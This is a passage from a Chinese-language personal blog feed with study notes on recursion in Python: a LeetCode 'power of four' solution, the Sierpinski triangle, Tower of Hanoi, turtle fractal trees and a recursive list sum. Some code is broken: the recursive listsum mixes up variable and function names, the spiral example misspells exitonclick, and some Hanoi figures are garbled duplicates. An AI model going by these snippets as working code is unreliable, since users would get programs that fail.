to check whether it is a power of 4.</p><p><strong>Example:</strong><br>Given num = 16, return true. Given num = 5, return false.</p><p><strong>Follow up</strong>: Could you solve it without loops/recursion?</p><p><strong>Credits:</strong><br>Special thanks to <a href="https://leetcode.com/discuss/user/yukuairoy" target="_blank" rel="external">@yukuairoy </a>for adding this problem and creating all test cases.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isPowerOfFour</span><span class="params">(self, num)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type num: int</div><div class="line">        :rtype: bool</div><div class="line">        """</div><div class="line">        <span class="keyword">if</span> num==<span class="number">0</span>:</div><div class="line">            <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">        <span class="keyword">while</span> num%<span class="number">4</span>==<span class="number">0</span>:</div><div class="line">            num/=<span class="number">4</span></div><div class="line">        <span class="keyword">return</span> num==<span class="number">1</span></div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;leetcode190题131题191题231题342题&quot;&gt;&lt;a href=&quot;#leetcode190题131题191题231题342题&quot; class=&quot;headerlink&quot; title=&quot;leetcode190题131题191题231题342题&quot;&gt;&lt;/a&gt;leetcode190题131题191题231题342题&lt;/h1&gt;&lt;h3 id=&quot;190Reverse-Bits&quot;&gt;&lt;a href=&quot;#190Reverse-Bits&quot; class=&quot;headerlink&quot; title=&quot;190Reverse Bits&quot;&gt;&lt;/a&gt;190Reverse Bits&lt;/h3&gt;&lt;p&gt;Reverse bits of a given 32 bits unsigned integer.
    
    </summary>
    
      <category term="leetcode" scheme="http://adamzeng.site/categories/leetcode/"/>
    
    
      <category term="leetcode" scheme="http://adamzeng.site/tags/leetcode/"/>
    
  </entry>
  
  <entry>
    <title>谢尔宾斯基三角形</title>
    <link href="http://adamzeng.site/2017/11/03/%E8%B0%A2%E5%B0%94%E5%AE%BE%E6%96%AF%E5%9F%BA%E4%B8%89%E8%A7%92%E5%BD%A2/"/>
    <id>http://adamzeng.site/2017/11/03/谢尔宾斯基三角形/</id>
    <published>2017-11-03T09:08:42.000Z</published>
    <updated>2017-11-04T13:16:50.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="谢尔宾斯基三角形"><a href="#谢尔宾斯基三角形" class="headerlink" title="谢尔宾斯基三角形"></a>谢尔宾斯基三角形</h1><p>另外一个展现自相似性的分形是谢尔宾斯基三角形。<a id="more"></a>Figure 3是一个示例。谢尔宾斯基三角形阐明了三路递归算法。用手绘制谢尔宾斯三角形的过程很简答。从一个大三角形开始。通过连接每一边的中点，将这个大三角形分成四个新的三角形。忽略刚刚创建的中间三角形，对三个三角形中的每一个应用相同的过程。每一次创建一组新的三角形时，都会将此过程递归应用于三个较小的角三角形。如果你有足够的铅笔，你可以无限重复这个过程。在继续阅读之前，你可以尝试运用所描述的方法自己绘制谢尔宾斯基三角形。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/4.%E9%80%92%E5%BD%92/4.8.%E8%B0%A2%E5%B0%94%E5%AE%BE%E6%96%AF%E5%9F%BA%E4%B8%89%E8%A7%92%E5%BD%A2/assets/4.8.%E8%B0%A2%E5%B0%94%E5%AE%BE%E6%96%AF%E5%9F%BA%E4%B8%89%E8%A7%92%E5%BD%A2.figure3.png" alt="image"></p><p><em>Figure 3</em></p><p>因为我们可以无限地应用算法，什么是基本情况？我们将看到，基本情况被任意设置为我们想要将三角形划分成块的次数。有时我们把这个数字称为分形的“度”。每次我们进行递归调用时，我们从度中减去1，直到0。当我们达到0度时，我们停止递归。在Figure3中生成谢尔宾斯基三角形的代码见ActiveCode 1。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> turtle</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">drawTriangle</span><span class="params">(points,color,myTurtle)</span>:</span></div><div class="line">    myTurtle.fillcolor(color)</div><div class="line">    myTurtle.up()</div><div class="line">    myTurtle.goto(points[<span class="number">0</span>][<span class="number">0</span>],points[<span class="number">0</span>][<span class="number">1</span>])</div><div class="line">    myTurtle.down()</div><div class="line">    myTurtle.begin_fill()</div><div class="line">    myTurtle.goto(points[<span class="number">1</span>][<span class="number">0</span>],points[<span class="number">1</span>][<span class="number">1</span>])</div><div class="line">    myTurtle.goto(points[<span class="number">2</span>][<span class="number">0</span>],points[<span class="number">2</span>][<span class="number">1</span>])</div><div class="line">    myTurtle.goto(points[<span class="number">0</span>][<span class="number">0</span>],points[<span class="number">0</span>][<span class="number">1</span>])</div><div class="line">    myTurtle.end_fill()</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getMid</span><span class="params">(p1,p2)</span>:</span></div><div class="line">    <span class="keyword">return</span> ((p1[<span class="number">0</span>]+p2[<span class="number">0</span>])/<span class="number">2</span>,(p1[<span class="number">1</span>]+p2[<span class="number">1</span>])/<span class="number">2</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sierpinski</span><span class="params">(points,degree,myTurtle)</span>:</span></div><div class="line">    colormap=[<span class="string">'blue'</span>,<span class="string">'red'</span>,<span class="string">'green'</span>,<span class="string">'white'</span>,<span class="string">'yellow'</span>,</div><div class="line">              <span class="string">'violet'</span>,<span class="string">'orange'</span>]</div><div class="line">    drawTriangle(points,colormap[degree],myTurtle)</div><div class="line">    <span class="keyword">if</span> degree&gt;<span class="number">0</span>:</div><div class="line">        sierpinski([points[<span class="number">0</span>],</div><div class="line">                   getMid(points[<span class="number">0</span>],points[<span class="number">1</span>]),</div><div class="line">                   getMid(points[<span class="number">0</span>],points[<span class="number">2</span>])],</div><div class="line">             degree<span class="number">-1</span>,myTurtle)</div><div class="line">        sierpinski([points[<span class="number">1</span>],</div><div class="line">                    getMid(points[<span class="number">0</span>],points[<span class="number">1</span>]),</div><div class="line">                    getMid(points[<span class="number">1</span>],points[<span class="number">2</span>])],</div><div class="line">             degree<span class="number">-1</span>,myTurtle)</div><div class="line">        sierpinski([points[<span class="number">2</span>],</div><div class="line">                    getMid(points[<span class="number">2</span>],points[<span class="number">1</span>]),</div><div class="line">                    getMid(points[<span class="number">0</span>],points[<span class="number">2</span>])],</div><div class="line">             degree<span class="number">-1</span>,myTurtle)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    myTurtle=turtle.Turtle()</div><div class="line">    myWin=turtle.Screen()</div><div class="line">    myPoints=[[<span class="number">-100</span>,<span class="number">-50</span>],[<span class="number">0</span>,<span class="number">100</span>],[<span class="number">100</span>,<span class="number">-50</span>]]</div><div class="line">    sierpinski(myPoints,<span class="number">3</span>,myTurtle)</div><div class="line">    myWin.exitonclick()</div><div class="line"></div><div class="line">    </div><div class="line">main()</div></pre></td></tr></table></figure><p>其实这段代码我没看懂太多，写的关于point的逻辑很奇怪。。。</p><h3 id="汉诺塔"><a href="#汉诺塔" class="headerlink" title="汉诺塔"></a>汉诺塔</h3><p>汉诺塔是由法国数学家爱德华·卢卡斯在 1883 年发明的。他的灵感来自一个传说，有一个印度教寺庙，将谜题交给年轻的牧师。在开始的时候，牧师们被给予三根杆和一堆 64 个金碟，每个盘比它下面一个小一点。他们的任务是将所有 64 个盘子从三个杆中一个转移到另一个。有两个重要的约束，它们一次只能移动一个盘子，并且它们不能在较小的盘子顶部上放置更大的盘子。牧师日夜不停每秒钟移动一块盘子。当他们完成工作时，传说，寺庙会变成灰尘，世界将消失。</p><p>虽然传说是有趣的，你不必担心世界不久的将来会消失。移动 64 个盘子的塔所需的步骤数是 <code>2^64 -1 = 18,446,744,073,709,551,615264-1 = 18,446,744,073,709,551,615</code>。以每秒一次的速度，即<code>584,942,417,355584,942,417,355</code> 年！。</p><p>Figure 1 展示了在从第一杆移动到第三杆的过程中的盘的示例。请注意，如规则指定，每个杆上的盘子都被堆叠起来，以使较小的盘子始终位于较大盘的顶部。如果你以前没有尝试过解决这个难题，你现在应该尝试下。你不需要花哨的盘子，一堆书或纸张都可以。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/4.%E9%80%92%E5%BD%92/4.10.%E6%B1%89%E8%AF%BA%E5%A1%94%E6%B8%B8%E6%88%8F/assets/4.10.%E6%B1%89%E8%AF%BA%E5%A1%94%E6%B8%B8%E6%88%8F.figure1.png" alt="image"></p><p><em>Figure 1</em></p><p>我们如何递归地解决这个问题？我们的基本情况是什么？让我们从下到上考虑这个问题。假设你有一个五个盘子的塔，在杆一上。如果你已经知道如何将四个盘子移动到杆二上，那么你可以轻松地将最底部的盘子移动到杆三，然后再将四个盘子从杆二移动到杆三。但是如果你不知道如何移动四个盘子怎么办？假设你知道如何移动三个盘子到杆三;那么很容易将第四个盘子移动到杆二，并将它们从杆三移动到它们的顶部。但是如果你不知道如何移动三个盘子呢？如何将两个盘子移动到杆二，然后将第三个盘子移动到杆三，然后移动两个盘子到它的顶部？但是如果你还不知道该怎么办呢？当然你会知道移动一个盘子到杆三足够容易。这听起来像是基本情况。</p><p>这里是如何使用中间杆将塔从起始杆移动到目标杆的步骤：</p><ol><li>使用目标杆将 <code>height-1</code> 的塔移动到中间杆。</li><li>将剩余的盘子移动到目标杆。</li><li>使用起始杆将 <code>height-1</code> 的塔从中间杆移动到目标杆。</li></ol><p>只要我们遵守规则，较大的盘子保留在栈的底部，我们可以使用递归的三个步骤，处理任何更大的盘子。上面概要中唯一缺失的是识别基本情况。最简单的汉诺塔是一个盘子的塔。在这种情况下，我们只需要将一个盘子移动到其最终目的地。 一个盘子的塔将是我们的基本情况。 此外，上述步骤通过在步骤1和3中减小塔的高度，使我们趋向基本情况。Listing 1 展示了解决汉诺塔的 Python 代码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">moveTower</span><span class="params">(height,fromPole, toPole, withPole)</span>:</span></div><div class="line">    <span class="keyword">if</span> height &gt;= <span class="number">1</span>:</div><div class="line">        moveTower(height<span class="number">-1</span>,fromPole,withPole,toPole)</div><div class="line">        moveDisk(fromPole,toPole)</div><div class="line">        moveTower(height<span class="number">-1</span>,withPole,toPole,fromPole)</div></pre></td></tr></table></figure><p><em>Listing 1</em></p><p>请注意，Listing 1 中的代码与描述几乎相同。算法的简单性的关键在于我们进行两个不同的递归调用，一个在第 3 行上，另一个在第 5 行。在第 3 行上，我们将初始杆上的底部圆盘移动到中间。下一行简单地将底部盘移动到其最终的位置。然后在第 5 行上，我们将塔从中间杆移动到最大盘子的顶部。当塔高度为 0 时检测到基本情况; 在这种情况下不需要做什么，所以 <code>moveTower</code> 函数简单地返回。关于以这种方式处理基本情况的重点是，从 <code>moveTower</code> 简单地返回以使 <code>moveDisk</code> 函数被调用。</p><p>函数 <code>moveDisk</code>，如 Listing 2 所示，非常简单。它所做的就是打印出一个盘子从一杆移动到另一杆。 如果你输入并运行 <code>moveTower</code> 程序，你可以看到它给你一个非常有效的解决方案。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">moveDisk</span><span class="params">(fp,tp)</span>:</span></div><div class="line">    print(<span class="string">"moving disk from"</span>,fp,<span class="string">"to"</span>,tp)</div></pre></td></tr></table></figure><p><em>Listing 2</em></p><p>现在你已经看到了 <code>moveTower</code> 和 <code>moveDisk</code> 的代码，你可能会想知道为什么我们没有明确记录什么盘子在什么杆上的数据结构。这里有一个提示：如果你要明确地跟踪盘子，你会使用三个 Stack 对象，每个杆一个。 答案是 Python 提供了我们需要调用的隐含的栈。</p><p>### </p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;谢尔宾斯基三角形&quot;&gt;&lt;a href=&quot;#谢尔宾斯基三角形&quot; class=&quot;headerlink&quot; title=&quot;谢尔宾斯基三角形&quot;&gt;&lt;/a&gt;谢尔宾斯基三角形&lt;/h1&gt;&lt;p&gt;另外一个展现自相似性的分形是谢尔宾斯基三角形。
    
    </summary>
    
      <category term="Python" scheme="http://adamzeng.site/categories/Python/"/>
    
    
      <category term="Python" scheme="http://adamzeng.site/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>可视化递归</title>
    <link href="http://adamzeng.site/2017/11/03/%E5%8F%AF%E8%A7%86%E5%8C%96%E9%80%92%E5%BD%92/"/>
    <id>http://adamzeng.site/2017/11/03/可视化递归/</id>
    <published>2017-11-03T08:38:05.000Z</published>
    <updated>2017-11-03T09:06:52.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="介绍：可视化递归"><a href="#介绍：可视化递归" class="headerlink" title="介绍：可视化递归"></a>介绍：可视化递归</h1><p>在上一节中，我们讨论了一些使用递归很容易解决的问题; 然而，我们可能很难找到一个模型或一种可视化方法知道在递归函数中发生了什么。这使得递归难以让人掌握。在本节中，我们将看到几个使用递归绘制一些有趣图片的例子。当你看到这些图片的形状，你会对递归过程有新的认识，可能有助于巩固你对递归理解。<a id="more"></a></p><p>我们使用的插图的工具是 Python 的 <code>turtle</code> 模块称为 <code>turtle</code>。<code>turtle</code> 是 Python 所有版本的标准库，并且非常易于使用。比喻很简单。你可以创建一只乌龟，乌龟能前进，后退，左转，右转等。乌龟可以让它的尾巴或上或下。当乌龟的尾巴向下，它移动时会画一条线。为了增加乌龟的艺术价值，你可以改变尾巴的宽度以及尾巴浸入的墨水的颜色。</p><p>这里有一个简单的例子来说明龟图形基础。我们将使用 <code>turtle</code> 模块递归绘制螺旋。 见 ActiveCode 1。导入 <code>turtle</code> 模块后，我们创建一个乌龟。当乌龟被创建时，它也创建一个窗口来绘制。接下来我们定义 <code>drawSpiral</code> 函数。这个简单函数的基本情况是当我们想要绘制的线的长度（由 len 参数给出）减小到零或更小时。如果线的长度大于零，我们让乌龟以 len 单位前进，然后向右转 90 度。当我们再次调用 <code>drawSpiral</code> 并缩短长度时递归。在ActiveCode 1 结束时，你会注意到我们调用函数 <code>myWin.exitonclick()</code>，这是一个方便的缩小窗口的方法，使乌龟进入等待模式，直到你单击窗口，然后程序清理并退出。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> turtle</div><div class="line">myTurtle=turtle.Turtle()</div><div class="line">myWin=turtle.Screen()</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">drawSpiral</span><span class="params">(myTurtle,lineLen)</span>:</span></div><div class="line">    <span class="keyword">if</span> lineLen&gt;<span class="number">0</span>:</div><div class="line">        myTurtle.forward(lineLen)</div><div class="line">        myTurtle.right(<span class="number">90</span>)</div><div class="line">        drawSpiral(myTurtle,lineLen<span class="number">-5</span>)</div><div class="line"></div><div class="line">drawSpiral(myTurtle,<span class="number">100</span>)</div><div class="line">myWin.exitoniclick()</div></pre></td></tr></table></figure><p>这是关于你知道的所有龟图形，以制作一些令人印象深刻的涂鸦。我们的下一个程序，将绘制一个分形树。分形来自数学的一个分支，并且与递归有很多共同之处。分形的定义是，当你看着它时，无论你放大多少，分形有相同的基本形状。大自然的一些例子是大陆的海岸线，雪花，山脉，甚至树木或灌木。这些自然现象中的许多的分形性质使得程序员能够为计算机生成的电影生成非常逼真的风景。在我们的下一个例子中，将生成一个分形树。</p><p>要理解这如何工作，需要想一想如何使用分形词汇来描述树。记住，我们上面说过，分形是在所有不同的放大倍率下看起来是一样的。如果我们将它翻译成树木和灌木，我们可能会说，即使一个小树枝也有一个整体树的相同的形状和特征。有了这个想法，我们可以说一棵树是树干，一棵较小的树向右走，另一棵较小的树向左走。如果你用递归的思想考虑这个定义，这意味着我们将树的递归定义应用到较小的左树和右树。</p><p>让我们把这个想法转换成一些 Python 代码。Listing 1 展示了如何使用我们的乌龟来生成分形树。让我们更仔细地看一下代码。你会看到在第 5 行和第 7 行，我们正在进行递归调用。在第 5 行，我们在乌龟向右转 20 度之后立即进行递归调用;这是上面提到的右树。然后在第 7 行，乌龟进行另一个递归调用，但这一次后左转 40 度。乌龟必须向左转 40 度的原因是，它需要撤消原来的向右转 20 度，然后再向左转 20 度，以绘制左树。还要注意，每次我们对树进行递归调用时，我们从 <code>branchLen</code> 参数中减去一些量; 这是为了确保递归树越来越小。你还应该看到到第 2 行的初始 if 语句是检查 <code>branchLen</code> 的基本情况大小。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">tree</span><span class="params">(branchLen,t)</span>:</span></div><div class="line">    <span class="keyword">if</span> branchLen &gt; <span class="number">5</span>:</div><div class="line">        t.forward(branchLen)</div><div class="line">        t.right(<span class="number">20</span>)</div><div class="line">        tree(branchLen<span class="number">-15</span>,t)</div><div class="line">        t.left(<span class="number">40</span>)</div><div class="line">        tree(branchLen<span class="number">-10</span>,t)</div><div class="line">        t.right(<span class="number">20</span>)</div><div class="line">        t.backward(branchLen)</div></pre></td></tr></table></figure><p><em>Listing 1</em></p><p>此树示例的完整程序在 ActiveCode 2 中。在运行代码之前，请思考你希望看到的树形状。看着递归调用，并想想这棵树将如何展开。它会对称地绘制树的右半边和左半边吗？ 它会先绘制右侧然后左侧？</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> turtle</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">tree</span><span class="params">(branchLen,t)</span>:</span></div><div class="line">    <span class="keyword">if</span> branchLen &gt; <span class="number">5</span>:</div><div class="line">        t.forward(branchLen)</div><div class="line">        t.right(<span class="number">20</span>)</div><div class="line">        tree(branchLen<span class="number">-15</span>,t)</div><div class="line">        t.left(<span class="number">40</span>)</div><div class="line">        tree(branchLen<span class="number">-15</span>,t)</div><div class="line">        t.right(<span class="number">20</span>)</div><div class="line">        t.backward(branchLen)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    t = turtle.Turtle()</div><div class="line">    myWin = turtle.Screen()</div><div class="line">    t.left(<span class="number">90</span>)</div><div class="line">    t.up()</div><div class="line">    t.backward(<span class="number">100</span>)</div><div class="line">    t.down()</div><div class="line">    t.color(<span class="string">"green"</span>)</div><div class="line">    tree(<span class="number">75</span>,t)</div><div class="line">    myWin.exitonclick()</div><div class="line"></div><div class="line">main()</div></pre></td></tr></table></figure><p><em>Activecode 2</em></p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/4.%E9%80%92%E5%BD%92/4.7.%E4%BB%8B%E7%BB%8D%EF%BC%9A%E5%8F%AF%E8%A7%86%E5%8C%96%E9%80%92%E5%BD%92/assets/4.7.%E4%BB%8B%E7%BB%8D%EF%BC%9A%E5%8F%AF%E8%A7%86%E5%8C%96%E9%80%92%E5%BD%92.ac1.png" alt="image"></p><p>注意树上的每个分支点如何对应于递归调用，并注意树的右半部分如何一直绘制到它的最短的树枝。你可以在 Figure 1 中看到这一点。现在，注意程序如何工作，它的方式是直到树的整个右侧绘制完成回到树干。你可以在 Figure 2 中看到树的右半部分。然后绘制树的左侧，但不是尽可能远地向左移动。相反，直到我们进入到左树最小的枝干，左树的右半部分才开始绘制。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/4.%E9%80%92%E5%BD%92/4.7.%E4%BB%8B%E7%BB%8D%EF%BC%9A%E5%8F%AF%E8%A7%86%E5%8C%96%E9%80%92%E5%BD%92/assets/4.7.%E4%BB%8B%E7%BB%8D%EF%BC%9A%E5%8F%AF%E8%A7%86%E5%8C%96%E9%80%92%E5%BD%92.figure1.png" alt="image"></p><p><em>Figure 1</em></p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/4.%E9%80%92%E5%BD%92/4.7.%E4%BB%8B%E7%BB%8D%EF%BC%9A%E5%8F%AF%E8%A7%86%E5%8C%96%E9%80%92%E5%BD%92/assets/4.7.%E4%BB%8B%E7%BB%8D%EF%BC%9A%E5%8F%AF%E8%A7%86%E5%8C%96%E9%80%92%E5%BD%92.figure2.png" alt="image"></p><p><em>Figure 2</em></p><p>这个简单的树程序只是一个起点，你会注意到树看起来不是特别现实，因为自然不像计算机程序那样对称。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;介绍：可视化递归&quot;&gt;&lt;a href=&quot;#介绍：可视化递归&quot; class=&quot;headerlink&quot; title=&quot;介绍：可视化递归&quot;&gt;&lt;/a&gt;介绍：可视化递归&lt;/h1&gt;&lt;p&gt;在上一节中，我们讨论了一些使用递归很容易解决的问题; 然而，我们可能很难找到一个模型或一种可视化方法知道在递归函数中发生了什么。这使得递归难以让人掌握。在本节中，我们将看到几个使用递归绘制一些有趣图片的例子。当你看到这些图片的形状，你会对递归过程有新的认识，可能有助于巩固你对递归理解。
    
    </summary>
    
      <category term="Python" scheme="http://adamzeng.site/categories/Python/"/>
    
    
      <category term="Python" scheme="http://adamzeng.site/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>计算整数列表和</title>
    <link href="http://adamzeng.site/2017/11/02/%E8%AE%A1%E7%AE%97%E6%95%B4%E6%95%B0%E5%88%97%E8%A1%A8%E5%92%8C/"/>
    <id>http://adamzeng.site/2017/11/02/计算整数列表和/</id>
    <published>2017-11-02T15:42:08.000Z</published>
    <updated>2017-11-03T08:37:07.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="计算整数列表和"><a href="#计算整数列表和" class="headerlink" title="计算整数列表和"></a>计算整数列表和</h1><p>我们将以一个简单的问题开始，你已经知道如何不使用递归解决。 假设你想计算整数列表的总和，例如：<code>[1,3,5,7,9]</code>。 计算总和的迭代函数见ActiveCode 1。函数使用累加器变量（<code>theSum</code>）来计算列表中所有整数的和，从 0 开始，加上列表中的每个数字。<a id="more"></a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">listsum</span><span class="params">(numList)</span>:</span></div><div class="line">    theSum = <span class="number">0</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> numList:</div><div class="line">        theSum = theSum + i</div><div class="line">    <span class="keyword">return</span> theSum</div><div class="line"></div><div class="line">print(listsum([<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">9</span>]))</div></pre></td></tr></table></figure><p><em>Activecode 1</em></p><p>假设没有while循环或for循环。你将如何计算整数列表的总和？如果你是一个数学家，你可能开始回忆加法是一个函数，这个函数定义了两个整数类型的参数。故将列表和问题从加一个列表重新定义为加一对整数，我们可以把列表重写为一个完全括号表达式。如下所示：<br><img src="https://facert.gitbooks.io/python-data-structure-cn/4.%E9%80%92%E5%BD%92/4.3.%E8%AE%A1%E7%AE%97%E6%95%B4%E6%95%B0%E5%88%97%E8%A1%A8%E5%92%8C/assets/4.3.%E8%AE%A1%E7%AE%97%E6%95%B4%E6%95%B0%E5%88%97%E8%A1%A8%E5%92%8C.1.png" alt="image"></p><p>我们也可以把表达式用另一种方式括起来</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/4.%E9%80%92%E5%BD%92/4.3.%E8%AE%A1%E7%AE%97%E6%95%B4%E6%95%B0%E5%88%97%E8%A1%A8%E5%92%8C/assets/4.3.%E8%AE%A1%E7%AE%97%E6%95%B4%E6%95%B0%E5%88%97%E8%A1%A8%E5%92%8C.2.png" alt="image"></p><p>注意，最内层的括号（7+9）我们可以没有任何循环或特殊结构来解决它。事实上，我们可以使用以下的简化序列来计算最终的和。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/4.%E9%80%92%E5%BD%92/4.3.%E8%AE%A1%E7%AE%97%E6%95%B4%E6%95%B0%E5%88%97%E8%A1%A8%E5%92%8C/assets/4.3.%E8%AE%A1%E7%AE%97%E6%95%B4%E6%95%B0%E5%88%97%E8%A1%A8%E5%92%8C.3.png" alt="image"></p><p>我们如何能把这个想法变成一个 Python 程序？ 首先，让我们以 Python 列表的形式重述求和问题。 我们可以说列表 <code>numList</code> 的和是列表的第一个元素<code>numList[0]</code> 和列表其余部分<code>numList [1:]</code> 之和的总和。 以函数形式表述： </p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/4.%E9%80%92%E5%BD%92/4.3.%E8%AE%A1%E7%AE%97%E6%95%B4%E6%95%B0%E5%88%97%E8%A1%A8%E5%92%8C/assets/4.3.%E8%AE%A1%E7%AE%97%E6%95%B4%E6%95%B0%E5%88%97%E8%A1%A8%E5%92%8C.4.png" alt="image"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">listsum</span><span class="params">(numlist)</span>:</span></div><div class="line">    <span class="keyword">if</span> len(numList)==<span class="number">1</span>:</div><div class="line">      <span class="keyword">return</span> numList[<span class="number">0</span>]</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">      <span class="keyword">return</span> numlist[<span class="number">0</span>]+listnum(numlist[<span class="number">1</span>:])</div><div class="line">print(listnum([<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">9</span>]))</div></pre></td></tr></table></figure><p><em>Active code 2</em></p><p>在这个清单中有几个关键地方。 首先，在第 2 行，我们检查列表是否为一个元素。这个检查是至关重要的，是我们的函数的转折子句。 长度为 1 的列表和是微不足道的; 它只是列表中的数字。 第二，在第 5 行函数调用自己！ 这就是我们称 listsum 算法递归的原因。<strong>递归函数是调用自身的函数</strong>。</p><p>Figure 1 展示了对列表<code>[1,3,5,7,9]</code> 求和所需的一系列递归调用。 你应该把这一系列的调用想象成一系列的简化。 每次我们进行递归调用时，我们都会解决一个较小的问题，直到达到问题不能减小的程度。 </p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/4.%E9%80%92%E5%BD%92/4.3.%E8%AE%A1%E7%AE%97%E6%95%B4%E6%95%B0%E5%88%97%E8%A1%A8%E5%92%8C/assets/4.3.%E8%AE%A1%E7%AE%97%E6%95%B4%E6%95%B0%E5%88%97%E8%A1%A8%E5%92%8C.figure1.png" alt="image"></p><p><em>Figure 1</em></p><p>当我们到达简单问题的点，我们开始拼凑每个小问题的答案，直到初始问题解决。Figure 2 展示了在 <code>listsum</code> 通过一系列调用返回的过程中执行的 add 操作。当 <code>listsum</code> 从最顶层返回时，我们就有了整个问题的答案。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/4.%E9%80%92%E5%BD%92/4.3.%E8%AE%A1%E7%AE%97%E6%95%B4%E6%95%B0%E5%88%97%E8%A1%A8%E5%92%8C/assets/4.3.%E8%AE%A1%E7%AE%97%E6%95%B4%E6%95%B0%E5%88%97%E8%A1%A8%E5%92%8C.figure2.png" alt="image"></p><p><em>Figure 2</em></p><h3 id="递归的三定律"><a href="#递归的三定律" class="headerlink" title="递归的三定律"></a>递归的三定律</h3><p>像阿西莫夫机器人，所有递归算法必须服从三个重要的定律：</p><ol><li>递归算法必须具有基本情况。</li><li>递归算法必须改变其状态并向基本情况靠近。</li><li>递归算法必须以递归方式调用自身。</li></ol><p>让我们更详细地看看每一个定律，看看它如何在 <code>listsum</code> 算法中使用。首先，基本情况是算法停止递归的条件。基本情况通常是足够小以直接求解的问题。在<code>listsum</code> 算法中，基本情况是长度为 1 